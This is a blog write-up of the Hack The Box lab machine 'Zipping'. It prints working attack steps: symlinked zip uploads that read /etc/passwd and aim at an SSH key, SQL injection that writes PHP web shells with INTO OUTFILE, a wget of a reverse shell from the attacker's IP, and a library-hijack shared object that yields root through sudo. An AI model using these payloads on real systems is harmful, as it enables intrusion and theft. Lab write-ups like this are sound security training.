---
layout: post
title: "HTB: Zipping"
author: Andrew Cherney
date: 2024-01-13 12:30:07
tags: htb medium-box upload-bypass webapp php binary-exploitation
icon: "assets/icons/zipping.png"
post_description: "After completing this machine and reading some other user's experiences this one feels at best a low medium and at worst a hard easy. There is some cool LFI with a file upload and subsequent RCE with SQLi, not very hard though. The null byte vector was patched for anyone reading this."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Zipping]
└──╼ $nmap -sC 10.10.11.229
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-12 10:26 CDT
Nmap scan report for 10.10.11.229
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http
|_http-title: Zipping | Watch store
```

<h2>Port 80 - http</h2>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Zipping]
└──╼ $dirsearch -u http://zipping.htb/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Active/Zipping/reports/http_zipping.htb/__23-09-12_10-48-45.txt

Target: http://zipping.htb/

[10:48:45] Starting: 
[10:48:49] 403 -  276B  - /.ht_wsr.txt
[10:48:49] 403 -  276B  - /.htaccess.bak1
[10:48:49] 403 -  276B  - /.htaccess.sample
[10:48:49] 403 -  276B  - /.htaccess.save
[10:48:49] 403 -  276B  - /.htaccess.orig
[10:48:49] 403 -  276B  - /.htaccessBAK
[10:48:49] 403 -  276B  - /.htaccessOLD2
[10:48:49] 403 -  276B  - /.htaccess_sc
[10:48:49] 403 -  276B  - /.htaccessOLD
[10:48:49] 403 -  276B  - /.htaccess_orig
[10:48:49] 403 -  276B  - /.htaccess_extra
[10:48:49] 403 -  276B  - /.htpasswds
[10:48:49] 403 -  276B  - /.httr-oauth
[10:48:49] 403 -  276B  - /.htpasswd_test
[10:48:49] 403 -  276B  - /.html
[10:48:49] 403 -  276B  - /.htm
[10:48:51] 403 -  276B  - /.php
[10:49:12] 301 -  311B  - /assets  ->  http://zipping.htb/assets/
[10:49:12] 200 -  510B  - /assets/
[10:49:50] 403 -  276B  - /server-status/
[10:49:50] 403 -  276B  - /server-status
[10:49:51] 301 -  309B  - /shop  ->  http://zipping.htb/shop/
[10:50:00] 200 -    2KB - /upload.php
[10:50:01] 403 -  276B  - /uploads/
[10:50:01] 301 -  312B  - /uploads  ->  http://zipping.htb/uploads/

Task Completed
```

{% include img_link src="/img/zipping/zipping_front_page" alt="front_page" ext="png" trunc=600 %}

![store page](/img/zipping/zipping_store_page.png)

![upload page](/img/zipping/zipping_upload_page.png)


We have a few goodies to look at for the immediate future. There is an upload page where we can upload zip files with pdfs inside. There is also a store page where parameters are passed through the url. Maybe some upload restriction bypass and SQLi combo?

<h2>Patched Rabbit Hole</h2>

<h3>Initial tests</h3>

```bash
touch test.pdf
zip test.zip test.pdf
```

![upload test pdf](/img/zipping/zipping_successful_upload.png)


After an upload the pdf is placed in what looks like a hash as a directory. I make a php file and see that it requires a pdf inside of the zip, and that there can only be 1 file inside. 

```bash
touch test.php%00.pdf
zip extensionbypass.zip test.php%00.pdf
```

It successfully uploads, and the null byte does space out the pdf extension from the php file, but when I head to `http://zipping[.]htb/uploads/13ff1bb09ded6e0d7016431fa8dd0fc9/test.php%00.pdf` the file doesn't exist, and more specifically the upload directory specified doesn't exist.

<h3>Coping</h3>

Okay despite that exact method not working I tried another one. The null byte within the filename does trick the logic reflected back to me but perhaps the underlying code is ignoring it.

![shell upload test](/img/zipping/zipping_null_byte_upload.png)

If I can change the hex value itself the back end has no way to parse through that. I was right, sort of. The logic at one point didn't account for this. Patch notes:


```
Machine Changelog
Last Updated:
9 days ago
7TH SEPTEMBER, 2023
[~]
CHANGE
Patched Unintended Solution
Added additional checks to the PHP application to prevent an unintended RCE via PHP webshell upload with null-byte injection.
```


<h2>Zip LFI</h2>

This whole excursion wasn't for naught, I now understood most of the logic behind the uploads. It can accept a zip file, which needs to contain a file with a pdf extenstion, which is then locally readable after upload. 

Enter our friend symlinks, which allow me to upload a file that links to a local resource and gives me LFI. I'll make a test payload to check the vulnerability but I am fairly certain if an empty pdf suffices this should bypass any filters. 

```bash
ln -s ../../../../../../../../../../../etc/passwd test.pdf
zip -r --symlinks test.zip test.pdf
```

After the upload the file itself attempts to load the pdf, but the response contains the referenced file:

```
HTTP/1.1 200 OK
Date: Fri, 15 Sep 2023 23:45:36 GMT
Server: Apache/2.4.54 (Ubuntu)
Last-Modified: Fri, 15 Sep 2023 23:45:23 GMT
ETag: "56d-6056e62e411f6"
Accept-Ranges: bytes
Content-Length: 1389
Connection: close
Content-Type: application/pdf


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

Places I looked for php files:

```bash
ln -s ../../../../../../../../../../../var/www/html/shop/functions.php functions.pdf
zip -r --symlinks functions.zip functions.pdf

ln -s ../../../../../../../../../../../var/www/html/shop/home.php home.pdf
zip -r --symlinks home.zip home.pdf

ln -s ../../../../../../../../../../../var/www/html/upload.php upload.pdf
zip -r --symlinks upload.zip upload.pdf

ln -s ../../../../../../../../../../../var/www/html/shop/index.php shopindex.pdf
zip -r --symlinks shopindex.zip shopindex.pdf

ln -s ../../../../../../../../../../../home/rektsu/.ssh/id_rsa sshkey.pdf
zip -r --symlinks sshkey.zip sshkey.pdf

ln -s ../../../../../../../../../../../var/www/html/shop/cart.php cart.pdf
zip -r --symlinks cart.zip cart.pdf

ln -s ../../../../../../../../../../../var/www/html/shop/product.php product.pdf
zip -r --symlinks product.zip product.pdf
```

No ssh key present, I'll spare you the sifting through all of these files and show the important finding as the segue into the next part.


<h1>User as rektsu</h1>

<h2>preg_match bypass</h2>

```php
shop/cart.php

<?php
// If the user clicked the add to cart button on the product page we can check for the form data
if (isset($_POST['product_id'], $_POST['quantity'])) {
    // Set the post variables so we easily identify them, also make sure they are integer
    $product_id = $_POST['product_id'];
    $quantity = $_POST['quantity'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
        echo '';
    } else {
        // Construct the SQL statement with a vulnerable parameter
        $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'";
        // Execute the SQL statement without any sanitization or parameter binding
        $product = $pdo->query($sql)->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if ($product && $quantity > 0) {
            // Product exists in database, now we can create/update the session variable for the cart
            if (isset($_SESSION['cart']) && is_array($_SESSION['cart'])) {
                if (array_key_exists($product_id, $_SESSION['cart'])) {
                    // Product exists in cart so just update the quanity
                    $_SESSION['cart'][$product_id] += $quantity;
                } else {
                    // Product is not in cart so add it
                    $_SESSION['cart'][$product_id] = $quantity;
                }
            } else {
                // There are no products in cart, this will add the first product to cart
                $_SESSION['cart'] = array($product_id => $quantity);
            }
        }
        // Prevent form resubmission...
        header('location: index.php?page=cart');
        exit;
    }
}

//ALL ELSE IRRELEVANT
```

The regex defining what is allowed in the parameter hard declares the end of the line with `$`. This is excellent news as we can use the new line byte %0a and run whatever we want permitting it runs within the database service. 

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#preg_match)


THe service in question is MYSQL and has leaked creds in the `functions.php` hidden file. The final piece to this puzzle is LFI from `shop/index.php`:

```php
shop/index.php

<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>
```

With that logic so long as the file exists and is php we can GET it. A common way to exploit SQL if you have LFI is to create files within the `/var/lib/mysql/` directory as SQL should have permissions to write there. The other important part of this puzzle is **INTO OUTFILE**, where MySQL allows you to send the results of a query (or defined string) into a file.

For more on that: [https://www.exploit-db.com/papers/14635](https://www.exploit-db.com/papers/14635)

```sql
%0a';select '<?php phpinfo(); ?>' into outfile '/var/lib/mysql/raccoon.php'; --1
```

I'll create a test file which will load the php info, and importantly I need to define the id of the item on the end to prevent the php from erroring out. 

![burp php info upload](/img/zipping/zipping_burp_newline_php_test.png)

![php info check](/img/zipping/zipping_phpinfo_test.png)

Bingo bango we got RCE. Next operation in order is to find out what user I am.

```
payload:

%0a';select '<?php system("whoami"); ?>' into outfile '/var/lib/mysql/raccoonwhoami.php'; --1
```

![whoami php upload](/img/zipping/zipping_whoami_sqli.png)

Lastly a cmd running php file upload to upload a persistent shell and get user.

```
payload:

%0a';select '<?="$_GET[0]"?>' into outfile '/var/lib/mysql/phpcmdraccoon.php'; --1
```

![cmd upload](/img/zipping/zipping_small_cmd_upload.png)

![cmd id test](/img/zipping/zipping_php_cmd_test_id.png)

Next I wget a pentest monkey shell and head to the file. I did need to check with a **pwd** that we were in the **shop** directory. 

```
page=/var/lib/mysql/phpcmdraccoon&0=wget%20http://10.10.14.5:8081/pentestmonkey.php
http://zipping.htb/shop/pentestmonkey.php
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Zipping]
└──╼ $nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.229 43556
Linux zipping 5.19.0-46-generic #47-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 16 13:30:11 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 02:29:00 up 22:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
bash: cannot set terminal process group (1149): Inappropriate ioctl for device
bash: no job control in this shell
rektsu@zipping:/$ cd ~
cd ~
rektsu@zipping:/home/rektsu$ ls
ls
test
user.txt
rektsu@zipping:/home/rektsu$ cat user.txt
cat user.txt
28f5b6ac7d3---------------------
```

<h1>Root</h1>

<h2>Exploiting ELFs</h2>


```bash
rektsu@zipping:/$ sudo -l
sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
rektsu@zipping:/$ strings /usr/bin/stock
strings /usr/bin/stock
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
exit
fopen
__libc_start_main
fprintf
dlopen
__isoc99_fscanf
__cxa_finalize
strchr
fclose
__isoc99_scanf
strcmp
__errno_location
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Hakaize
St0ckM4nager
/root/.stock.csv
Enter the password: 
Invalid password, please try again.
```

I find that in the initial enumeration of root I have access to run this ELF as sudo. I strings it to fine two odd things: **Hakaize** **St0ckM4nager**, credentials perhaps?? Well the easy tell here is to run strace and see what the ELF logic does.

```bash
rektsu@zipping:/home/rektsu/.config$ strace stock
strace stock
execve("/usr/bin/stock", ["stock"], 0x7ffc057ec100 /* 15 vars */) = 0
brk(NULL)                               = 0x55aa8beef000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffc059c00f0) = -1 EINVAL (Invalid argument)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fa4c2619000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=18225, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 18225, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fa4c2614000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\3206\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2072888, ...}, AT_EMPTY_PATH) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2117488, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fa4c2400000
mmap(0x7fa4c2422000, 1544192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7fa4c2422000
mmap(0x7fa4c259b000, 356352, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19b000) = 0x7fa4c259b000
mmap(0x7fa4c25f2000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f1000) = 0x7fa4c25f2000
mmap(0x7fa4c25f8000, 53104, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fa4c25f8000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fa4c2611000
arch_prctl(ARCH_SET_FS, 0x7fa4c2611740) = 0
set_tid_address(0x7fa4c2611a10)         = 23472
set_robust_list(0x7fa4c2611a20, 24)     = 0
rseq(0x7fa4c2612060, 0x20, 0, 0x53053053) = 0
mprotect(0x7fa4c25f2000, 16384, PROT_READ) = 0
mprotect(0x55aa8b12a000, 4096, PROT_READ) = 0
mprotect(0x7fa4c264f000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7fa4c2614000, 18225)           = 0
newfstatat(1, "", {st_mode=S_IFIFO|0600, st_size=0, ...}, AT_EMPTY_PATH) = 0
getrandom("\xad\xa4\x1b\xa1\xf6\x79\xe8\x75", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x55aa8beef000
brk(0x55aa8bf10000)                     = 0x55aa8bf10000
newfstatat(0, "", {st_mode=S_IFIFO|0600, st_size=0, ...}, AT_EMPTY_PATH) = 0
read(0, St0ckM4nager
"St0ckM4nager\n", 4096)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
read(0, 1
"1\n", 4096)                    = 2
openat(AT_FDCWD, "/root/.stock.csv", O_RDONLY) = -1 EACCES (Permission denied)
write(1, "Enter the password: \n==========="..., 183Enter the password: 
================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: You do not have permissions to read the file) = 183
lseek(0, -1, SEEK_CUR)                  = -1 ESPIPE (Illegal seek)
exit_group(1)                           = ?
+++ exited with 1 +++
```

Halfway through it did require a password, I tried St0ckM4nager and you can see the file carried onwards. It references a specific file inside of our users **.config** directory. 

```bash
rektsu@zipping:/home/rektsu/.config$ ls
ls
```

It's empty and in a location I can write to. Here is an easy c shell I can get:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void method()__attribute__((constructor));
void method() {
    system("/bin/bash -i");
}
```

```bash
rektsu@zipping:/home/rektsu/.config$ wget http://10.10.14.5:8081/raccoonshell.c
<.config$ wget http://10.10.14.5:8081/raccoonshell.c
--2023-09-16 02:55:27--  http://10.10.14.5:8081/raccoonshell.c
Connecting to 10.10.14.5:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 148 [text/x-csrc]
Saving to: 'raccoonshell.c.1'

     0K                                                       100% 22.0K=0.007s

2023-09-16 02:55:27 (22.0 KB/s) - 'raccoonshell.c.1' saved [148/148]
rektsu@zipping:/tmp$ gcc -shared -fpic -o libcounter.so raccoonshell.c
gcc -shared -fpic -o libcounter.so raccoonshell.c
raccoonshell.c: In function 'method':
raccoonshell.c:6:5: warning: implicit declaration of function 'system' [-Wimplicit-function
-declaration]
    6 |     system("/bin/bash -i");
      |     ^~~~~~
rektsu@zipping:/tmp$ sudo /usr/bin/stock
sudo /usr/bin/stock
St0ckM4nager
bash: cannot set terminal process group (1125): Inappropriate ioctl for device
bash: no job control in this shell
root@zipping:/tmp# cat /root/root.txt
cat /root/root.txt
109ac2e64a----------------------

```

